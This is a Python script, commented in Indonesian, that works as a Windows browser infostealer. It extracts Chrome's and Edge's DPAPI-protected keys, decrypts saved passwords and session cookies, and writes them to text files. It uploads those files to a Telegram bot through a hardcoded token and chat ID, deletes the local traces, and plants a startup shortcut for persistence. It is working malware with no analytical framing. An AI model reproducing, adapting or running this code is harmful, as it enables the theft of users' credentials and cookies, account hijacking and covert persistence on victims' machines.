import os
import sqlite3
import shutil
import json
import base64
import requests
from Crypto.Cipher import AES
import win32crypt
import winshell
from win32com.client import Dispatch

# Gantilah dengan token bot Anda dan chat ID
BOT_TOKEN = '7328722686:AAHFs2h1bn04LTj4GVwfuivoVIdZLkNM638'
CHAT_ID = '6965763248'

def send_telegram_message(message, file_path=None):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/'
    if file_path:
        with open(file_path, 'rb') as file:
            response = requests.post(url + 'sendDocument', 
                                     data={'chat_id': CHAT_ID}, 
                                     files={'document': file})
    else:
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'  # Opsional: untuk format HTML
        }
        response = requests.post(url + 'sendMessage', data=payload)
    
    try:
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Gagal mengirim pesan: {e}")

def get_ip_info():
    try:
        response = requests.get('https://ipinfo.io')
        data = response.json()
        ip = data.get('ip')
        country = data.get('country')
        return ip, country
    except requests.RequestException as e:
        return None, None

def get_encryption_key(local_state_path):
    with open(local_state_path, 'r') as file:
        local_state = json.loads(file.read())
    encryption_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encryption_key = encryption_key[5:]  # Hapus prefix 'DPAPI'
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

def decrypt_value(encrypted_value, key):
    try:
        if encrypted_value[:3] in [b'v10', b'v11']:
            encrypted_value = encrypted_value[3:]  # Hapus indikator versi
            iv = encrypted_value[:12]  # 12 byte pertama adalah IV
            encrypted_value = encrypted_value[12:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(encrypted_value)[:-16].decode()
        else:
            return "Format enkripsi tidak didukung"
    except Exception as e:
        return "Gagal mendekripsi"

def get_firefox_profiles(user_data_path):
    profiles = []
    
    # Temukan semua folder di direktori profil Firefox
    for folder in os.scandir(user_data_path):
        if folder.is_dir() and (folder.name.endswith('.default-release') or folder.name.endswith('.default')):
            profiles.append(folder.name)
    
    return profiles

def get_browser_data(browser_name, user_data_path, profile_subfolder, login_db_subpath, cookies_db_subpath, local_state_filename):
    key = None
    if local_state_filename:
        key = get_encryption_key(os.path.join(user_data_path, local_state_filename))

    # Temukan semua profil browser yang ada
    profiles_path = os.path.join(user_data_path, profile_subfolder)
    profiles = [f.name for f in os.scandir(profiles_path) if f.is_dir()]

    all_cookies = []
    all_logins = []

    for profile in profiles:
        # Path untuk Cookies dan Login Data
        cookies_db_path = os.path.join(profiles_path, profile, cookies_db_subpath)
        login_db_path = os.path.join(profiles_path, profile, login_db_subpath)

        if not os.path.exists(cookies_db_path) or not os.path.exists(login_db_path):
            continue
        
        # Salin database ke direktori saat ini
        shutil.copy2(cookies_db_path, f'{browser_name}_Cookies_{profile}')
        shutil.copy2(login_db_path, f'{browser_name}_Login Data_{profile}')

        # Proses cookies
        conn = sqlite3.connect(f'{browser_name}_Cookies_{profile}')
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies")
        for row in cursor.fetchall():
            host_key = row[0]
            name = row[1]
            encrypted_value = row[2]
            path = row[3]
            expires_utc = row[4]
            is_secure = row[5]
            cookie_value = decrypt_value(encrypted_value, key) if key else None
            all_cookies.append({
                'browser': browser_name,
                'profile': profile,
                'host_key': host_key,
                'name': name,
                'value': cookie_value,
                'path': path,
                'expires': expires_utc,
                'is_secure': is_secure,
            })
        cursor.close()
        conn.close()

        # Proses logins
        conn = sqlite3.connect(f'{browser_name}_Login Data_{profile}')
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            password = decrypt_value(encrypted_password, key) if key else None
            all_logins.append({
                'browser': browser_name,
                'profile': profile,
                'url': url,
                'username': username,
                'password': password
            })
        cursor.close()
        conn.close()

        # Bersihkan
        os.remove(f'{browser_name}_Cookies_{profile}')
        os.remove(f'{browser_name}_Login Data_{profile}')

    return all_cookies, all_logins

def main():
    browsers = {
        'Chrome': {
            'user_data_path': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
            'profile_subfolder': '',
            'login_db_subpath': 'Login Data',
            'cookies_db_subpath': 'Network/Cookies',
            'local_state_filename': 'Local State'
        },
        'Edge': {
            'user_data_path': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
            'profile_subfolder': '',
            'login_db_subpath': 'Login Data',
            'cookies_db_subpath': 'Network/Cookies',
            'local_state_filename': 'Local State'
        },
        'Firefox': {
            'user_data_path': os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles'),
            'profile_subfolder': '',  # Dapat diabaikan untuk Firefox
            'login_db_subpath': 'logins.json',
            'cookies_db_subpath': 'cookies.sqlite',
            'local_state_filename': ''
        }
    }

    all_cookies = []
    all_logins = []

    for browser_name, paths in browsers.items():
        if browser_name == 'Firefox':
            profiles = get_firefox_profiles(paths['user_data_path'])
            for profile in profiles:
                paths['profile_subfolder'] = profile
                cookies, logins = get_browser_data(browser_name, **paths)
                all_cookies.extend(cookies)
                all_logins.extend(logins)
        else:
            cookies, logins = get_browser_data(browser_name, **paths)
            all_cookies.extend(cookies)
            all_logins.extend(logins)

    # Simpan cookies ke file cookies.txt dalam format Netscape
    with open('cookies.txt', 'w') as file:
        file.write("# Netscape HTTP Cookie File\n")
        file.write("# http://curl.haxx.se/rfc/cookie_spec.html\n")
        file.write("# This file was generated by Python\n")
        for cookie in all_cookies:
            file.write(f"# Browser: {cookie['browser']}\n")
            file.write(f"# Profile: {cookie['profile']}\n")
            file.write(f"{cookie['host_key']}\tTRUE\t{cookie['path']}\t{'TRUE' if cookie['is_secure'] else 'FALSE'}\t{cookie['expires']}\t{cookie['name']}\t{cookie['value']}\n")
    
    # Simpan logins ke file login.txt
    with open('login.txt', 'w') as file:
        for login in all_logins:
            file.write(f"# Browser: {login['browser']}\n")
            file.write(f"# Profile: {login['profile']}\n")
            file.write(f"URL: {login['url']}\n")
            file.write(f"Username: {login['username']}\n")
            file.write(f"Password: {login['password']}\n")
            file.write("\n")

    send_telegram_message("Cookies and logins are attached.", file_path='cookies.txt')
    send_telegram_message("Logins are attached.", file_path='login.txt')
    
    os.remove('cookies.txt')
    os.remove('login.txt')

def create_startup_shortcut():
    startup_folder = winshell.startup()
    shortcut_path = os.path.join(startup_folder, "MyScript.lnk")
    target_path = os.path.abspath(__file__)
    working_directory = os.path.dirname(target_path)
    icon_path = target_path

    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = target_path
    shortcut.WorkingDirectory = working_directory
    shortcut.IconLocation = icon_path
    shortcut.save()

if __name__ == "__main__":
    main()
    create_startup_shortcut()
